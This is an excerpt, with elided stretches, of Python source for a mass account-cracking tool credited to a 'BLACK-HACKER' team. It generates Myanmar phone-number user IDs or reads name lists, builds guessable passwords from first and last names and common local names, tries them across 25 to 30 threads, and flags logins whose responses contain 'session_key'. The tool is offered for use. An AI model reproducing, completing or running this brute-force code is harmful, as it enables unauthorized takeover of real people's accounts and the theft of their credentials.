...
╚██████╗██║  ██║╚██████╔╝███████╗██║  ██║\033[1;38m 
 ╚═════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝\033[1;97m
----------------------------------------------
AUTHER    :  Kaung Htet (Leader|Admin)
TEAM :  BLACK-HACKER
Facebook : Draken Kun
Tool Name: RANDOM UPDATE FREE
RUN THIS OPEN TIME ON 1111 V P N NICE WORKING
--------------------------------------------
\033[1: VERSION : 11.11
------------------------------------------
""")
...
def Main_ZIDI():
        ...
        if MYANMAR =='1':
            ...
            os.system(f'xdg-open https://github.com/LuCiFeR7238')
            Main_ZIDI()
        elif MYANMAR =='5':
            Main_ZIDI()
        elif shm =='0':
...
def gmail():
                ...
                with tred(max_workers=30) as Aking:
                        ...
                        for user in fo:
                                ...
                                fs = first_name.lower()
                                ls = last_name.lower()
                                passlist = [fs+ls,fs+' '+ls,fs+'123',fs+'12345',fs+'1122',fs,fs+'1234',fs+'908070',fs+'10020']
...
def MM():
    ...
    for nmbr in range(limit):
        ...
        user.append(nmp)
    with tred(max_workers=25) as ZIDI:
        clear()
        tl = str(len(user))
        print(' [+] Total accounts : '+tl)
        ...
        for psx in user:
            ids = "959"+code+psx
            passlist = ['i love you','iloveyou','first8','last8','first6','last6789','kaungkaung','lwanhninwai','shinelay123','htet12345','123456','1122233','zawzaw','kyawkyaw','aungaung','shwzin','shwezin123','myatthu123','monlay123','heinhtet12345','thanthan123','thuthu12345','ayeaye','ayeaye12345','theinthein','minmin123']
    ...
    try:
        ...
        for pas in passlist:
                ...
                if 'session_key' in po:
                        ...
                        #print(f'\r\r\33[1m\33[1;35m [CHECKPOINT] '+uid+' | '+pas+'\033[1;97m')
